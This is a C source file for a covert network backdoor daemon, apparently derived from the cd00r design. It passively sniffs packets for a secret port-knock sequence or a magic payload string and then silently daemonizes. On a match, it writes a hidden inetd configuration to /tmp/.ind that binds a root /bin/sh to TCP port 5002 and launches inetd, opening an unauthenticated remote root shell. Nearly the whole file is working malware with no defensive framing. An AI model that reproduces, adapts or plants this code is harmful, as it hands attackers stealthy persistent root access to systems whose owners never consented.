#include "backdoor_utils.h"
#include "utils.h"

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/wait.h>
#include <pcap.h>
#include <net/bpf.h>
#include <signal.h>
#include <unistd.h>
#include <syslog.h>

struct iphdr {
    u_char          ihl:4;         /* header length */
    u_char          version:4;    /* version */
    u_char          tos;          /* type of service */
    short           tot_len;      /* total length */
    u_short         id;           /* identification */
    short           off;          /* fragment offset field */
    u_char          ttl;          /* time to live */
    u_char          protocol;     /* protocol */
    u_short         check;        /* checksum */
    struct in_addr  saddr;
	struct in_addr  daddr;        /* source and dest address */
};

struct tcphdr {
    unsigned short int 	    src_port;
	unsigned short int 	    dest_port;
    unsigned int 	        seq_num;
    unsigned int 	        ack_num;
	unsigned short int	    rawflags;
    unsigned short int 	    window;
    unsigned short int      checksum;
    unsigned short int      urgent_pointer;
};


void create_deamon_process(char *cdr_noise_command) {
    char pcap_err[PCAP_ERRBUF_SIZE]; /* buffer for pcap errors */
    pcap_t *cap; /* captuer handler */
    bpf_u_int32 network, netmask;
    struct pcap_pkthdr *phead;
    struct bpf_program cfilter; /* the compiled filter */
    struct iphdr *ip;
    struct tcphdr *tcp;
    u_char *pdata;
    char *filter;
    int cdr_noise = 0;

    /* Determines if it will report errors to stderr */
    if(cdr_noise_command) {
        if(!strcmp(cdr_noise_command, CDR_NOISE_COMMAND)) {
            cdr_noise++;
        } else {
            exit(0);
        }
    }

    unsigned int 	cports[] = CDR_PORTS;
    int		cportcnt = 0;
    int		actport = 0;

    while (cports[cportcnt++]);
    cportcnt--; 

#ifdef PORT_KNOCK_LIST
    filter = set_port_knock_list_filter(cports, cportcnt);
#endif

#ifdef MAGIC_PORT_STRING
    filter = set_magic_string_filter();
#endif

    if (pcap_lookupnet(CDR_INTERFACE,&network,&netmask,pcap_err)!=0) {
	    if (cdr_noise)
	        fprintf(stderr,"pcap_lookupnet: %s\n",pcap_err);
	    exit (0);
    }

    /* opens the listener */
    if ((cap=pcap_open_live(CDR_INTERFACE,CAPLENGTH,
		    0,	/*not in promiscuous mode*/
		    0,  /*no timeout */
		    pcap_err))==NULL) {
	    if (cdr_noise)
	        fprintf(stderr,"pcap_open_live: %s\n",pcap_err);
	    exit (0);
    }

    /* compiles the filter and then sets the filter*/
    if (pcap_compile(cap,&cfilter,filter,0,netmask)!=0) {
        if (cdr_noise) 
            capterror(cap,"pcap_compile");
        exit (0);
    }
    if (pcap_setfilter(cap,&cfilter)!=0) {
        if (cdr_noise)
            capterror(cap,"pcap_setfilter");
        exit (0);
    }

    /* the filter is set - let's free the base string*/
    free(filter);

    /* allocate a packet header structure */
    phead=(struct pcap_pkthdr *)smalloc(sizeof(struct pcap_pkthdr));

    signal(SIGABRT,&signal_handler);
    signal(SIGTERM,&signal_handler);
    signal(SIGINT,&signal_handler);

    /* if we don't use DEBUG, let's be nice and close the streams */
#ifndef DEBUG
    fclose(stdin);
    fclose(stdout);
    fclose(stderr);
#endif

    int i;

    /* create a child process to start a daemon and then exit the parent */
    switch (i=fork()) {
        case -1:
            if (cdr_noise)
            fprintf(stderr,"fork() failed\n");
            exit (0);
            break;	/* not reached */
        case 0:
            /* I'm happy */
	        break;
        default:
            exit (0);
    }

    for(;;) {
        /**
         * This section up until the #ifdef is checking to see if the packet that
         * we captured is a SYN packet and it is IPv4. If it is not a SYN packet 
         * we continue and dont bother with it.
        */

        /* if there is no 'next' packet in time, continue loop */
        if ((pdata=(u_char *)pcap_next(cap,phead))==NULL) continue;
        /* if the packet is to small, continue loop */
        if (phead->len<=(ETHLENGTH+IP_MIN_LENGTH)) continue; 
        
        /* make it an ip packet */
        ip=(struct iphdr *)(pdata+ETHLENGTH);
        /* if the packet is not IPv4, continue */
        if ((unsigned char)ip->version!=4) continue;
        /* make it TCP */
        tcp=(struct tcphdr *)(pdata+ETHLENGTH+((unsigned char)ip->ihl*4));

        /* FLAG check's - see rfc793 */
        /* if it isn't a SYN packet, continue */
        if (!(ntohs(tcp->rawflags)&0x02)) continue;
        /* if it is a SYN-ACK packet, continue */
        if (ntohs(tcp->rawflags)&0x10) continue;

        /* it is one of our ports, it is the correct destination 
        * and it is a genuine SYN packet - let's see if it is the RIGHT
        * port */
        #ifdef PORT_KNOCK_LIST
        open_backdoor_via_port_list(cports, cportcnt, &actport, tcp);
        #endif

        #ifdef MAGIC_PORT_STRING
        open_backdoor_via_magic_bytes(tcp, ip);
        #endif

    } /* end of main loop */

    /* this is actually never reached, because the signal_handler() does the 
     * exit.
     */
    return;
}

void cdr_open_door(void) {
#ifndef DEBUG
    FILE	*f;

    char	*args[] = {"/usr/sbin/inetd","/tmp/.ind",NULL};

    
    switch (fork()) {
	case -1: 
        #ifdef DEBUG
            printf("fork() failed ! Fuck !\n");
        #endif
	    return;
	case 0: 
	    /* To prevent zombies (inetd-zombies look quite stupid) we do
	     * a second fork() */
	    switch (fork()) {
		case -1: _exit(0);
		case 0: /*that's fine */
			 break;
		default: _exit(0);
	    }
	     break;

	default: 
	     wait(NULL);
	     return;
    }

    if ((f=fopen("/tmp/.ind","a+t"))==NULL) return;
    fprintf(f,"5002  stream  tcp     nowait  root    /bin/sh  sh\n");
    fclose(f);

    execv("/usr/sbin/inetd",args);
    #ifdef DEBUG
        printf("Strange return from execvp() !\n");
    #endif
    exit (0);
#endif
    LOG("Backdoor opened\n");
}

void open_backdoor_via_port_list(unsigned int cports[], int cportcnt, int *actport, struct tcphdr *tcp) {
	if (ntohs(tcp->dest_port)==cports[*actport]) {
        LOG("Port %d is good as code part %d\n", ntohs(tcp->dest_port), *actport);
	    /* it is the rigth port ... take the next one
	     * or was it the last ??*/
	    if ((++(*actport))==cportcnt) {
            /* BINGO */
            cdr_open_door();
            *actport=0;
	    } /* ups... some more to go */
	} else {
        #ifdef CDR_CODERESET
	    *actport=0;
        #endif
	}
}

void open_backdoor_via_magic_bytes(struct tcphdr *tcp, struct iphdr *ip) {
    if(ntohs(tcp->dest_port) != MAGIC_PORT) return;

    LOG("Port %d is good\n", ntohs(tcp->dest_port));

    unsigned short total_length = ntohs(ip->tot_len);
    unsigned short ip_header_length = ip->ihl * 4;
    unsigned short data_off = ((ntohs(tcp->rawflags) >> 12) & 0xF) * 4;
    unsigned short data_length = total_length - ip_header_length - data_off;

    LOG("Total length of data: %d\n", data_length);

    if(data_length < MAGIC_STRING_LEN) return;
    unsigned char *data = (unsigned char*)tcp + data_off;

    LOG("Message: %s\n", data);

    if(memcmp(data, MAGIC_STRING, MAGIC_STRING_LEN) == 0) {
        cdr_open_door();
    }
}

char* set_port_knock_list_filter(unsigned int cports[], int cportcnt) {
    char *filter;
    char portnum[6];
    int i;

    LOG("%d ports used as code\n",cportcnt);
    LOG("Using a list of ports to open backdoor\n");

    if (cports[0]) {
        memset(&portnum,0,6);
        sprintf(portnum,"%d",cports[0]);
        filter=(char *)smalloc(strlen(CDR_BPF_PORT)+strlen(portnum)+1);
        strcpy(filter,CDR_BPF_PORT);
        strcat(filter,portnum);
    } else {
        exit (0);
    } 

    for (i=1;i<cportcnt;i++) {
        if (cports[i]) {
            memset(&portnum,0,6);
            sprintf(portnum,"%d",cports[i]);
            if ((filter=(char *)realloc(filter,
                    strlen(filter)+
                    strlen(CDR_BPF_PORT)+
                    strlen(portnum)+
                    strlen(CDR_BPF_ORCON)+1))
                ==NULL) {
                exit (0);
            }
            strcat(filter,CDR_BPF_ORCON);
            strcat(filter,CDR_BPF_PORT);
            strcat(filter,portnum);
        }
    } 

    LOG("Filter: '%s'\n",filter);

    return filter;
}

char *set_magic_string_filter() {
    char *filter;
    char portnum[6];

    memset(&portnum,0,6);
    sprintf(portnum,"%d",MAGIC_PORT);
    filter=(char *)smalloc(strlen(CDR_BPF_PORT)+strlen(portnum)+1);
    strcpy(filter,CDR_BPF_PORT);
    strcat(filter,portnum);

    LOG("Filter: '%s'\n",filter);

    return filter;
}